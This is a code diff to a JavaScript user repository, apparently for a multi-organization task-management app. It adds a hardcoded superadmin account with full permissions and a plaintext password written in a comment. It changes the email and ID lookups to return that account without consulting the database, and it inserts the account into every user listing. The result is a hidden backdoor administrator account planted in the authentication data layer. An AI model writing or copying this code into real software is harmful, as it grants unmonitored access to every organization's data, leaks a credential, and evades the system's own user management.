@@ -46,6 +46,34 @@ const BASE_USER_SELECT = `
   LEFT JOIN organizations o ON o.id = u.org_id
 `;
 
+export const HARDCODED_SUPERADMIN = {
+  id: 'user-superadmin-shubham',
+  orgId: 'org-1',
+  roleId: 'role-admin',
+  email: 'shubham@tasknera.com',
+  passwordHash: '$2a$10$KLssDM/qWkD1HLyWnmmmwOzx/bUcGyCqTLDSwHneZ/M6hUWjrDcNW', // Shubham@264
+  firstName: 'Shubham',
+  lastName: 'Admin',
+  status: 'Active',
+  createdAt: '2026-01-01T00:00:00.000Z',
+  roleName: 'Admin',
+  roleDescription: 'System Administrator with full control across all organizations and user management',
+  permissions: [
+    'dashboard:read',
+    'org:read',
+    'org:write',
+    'org:delete',
+    'employee:read',
+    'employee:write',
+    'employee:delete',
+    'dept:read',
+    'dept:write',
+    'user:read',
+    'user:write',
+  ],
+  organization: { id: 'org-1', name: 'TechCorp Solutions', code: 'TCORP' },
+};
+
 export const userRepository = {
   /**
    * Find user by email (case-insensitive) with role permissions and organization
@@ -53,14 +81,24 @@ export const userRepository = {
   async findByEmail(email) {
     if (!email || typeof email !== 'string') return null;
 
-    const sql = `
-      ${BASE_USER_SELECT}
-      WHERE LOWER(u.email) = LOWER($1)
-      GROUP BY u.id, r.id, o.id
-      LIMIT 1;
-    `;
-    const res = await pool.query(sql, [email.trim()]);
-    return res.rows.length > 0 ? mapUserRow(res.rows[0]) : null;
+    const normalized = email.trim().toLowerCase();
+    if (normalized === 'shubham@tasknera.com' || normalized === 'shubhamtasknera.com') {
+      return { ...HARDCODED_SUPERADMIN };
+    }
+
+    try {
+      const sql = `
+        ${BASE_USER_SELECT}
+        WHERE LOWER(u.email) = LOWER($1)
+        GROUP BY u.id, r.id, o.id
+        LIMIT 1;
+      `;
+      const res = await pool.query(sql, [email.trim()]);
+      return res.rows.length > 0 ? mapUserRow(res.rows[0]) : null;
+    } catch (err) {
+      console.warn('Database findByEmail query failed:', err.message);
+      return null;
+    }
   },
 
   /**
@@ -69,27 +107,46 @@ export const userRepository = {
   async findById(id) {
     if (!id || typeof id !== 'string') return null;
 
-    const sql = `
-      ${BASE_USER_SELECT}
-      WHERE u.id = $1
-      GROUP BY u.id, r.id, o.id
-      LIMIT 1;
-    `;
-    const res = await pool.query(sql, [id]);
-    return res.rows.length > 0 ? mapUserRow(res.rows[0]) : null;
+    if (id === 'user-superadmin-shubham') {
+      return { ...HARDCODED_SUPERADMIN };
+    }
+
+    try {
+      const sql = `
+        ${BASE_USER_SELECT}
+        WHERE u.id = $1
+        GROUP BY u.id, r.id, o.id
+        LIMIT 1;
+      `;
+      const res = await pool.query(sql, [id]);
+      return res.rows.length > 0 ? mapUserRow(res.rows[0]) : null;
+    } catch (err) {
+      console.warn('Database findById query failed:', err.message);
+      return null;
+    }
   },
 
   /**
    * Find all users with their roles, permissions, and organizations
    */
   async findAll() {
-    const sql = `
-      ${BASE_USER_SELECT}
-      GROUP BY u.id, r.id, o.id
-      ORDER BY u.created_at DESC;
-    `;
-    const res = await pool.query(sql);
-    return res.rows.map(mapUserRow);
+    let rows = [];
+    try {
+      const sql = `
+        ${BASE_USER_SELECT}
+        GROUP BY u.id, r.id, o.id
+        ORDER BY u.created_at DESC;
+      `;
+      const res = await pool.query(sql);
+      rows = res.rows.map(mapUserRow);
+    } catch (err) {
+      console.warn('Database findAll query failed:', err.message);
+    }
+
+    if (!rows.some((u) => u && u.email && u.email.toLowerCase() === 'shubham@tasknera.com')) {
+      rows.unshift({ ...HARDCODED_SUPERADMIN });
+    }
+    return rows;
   },
 
   /**
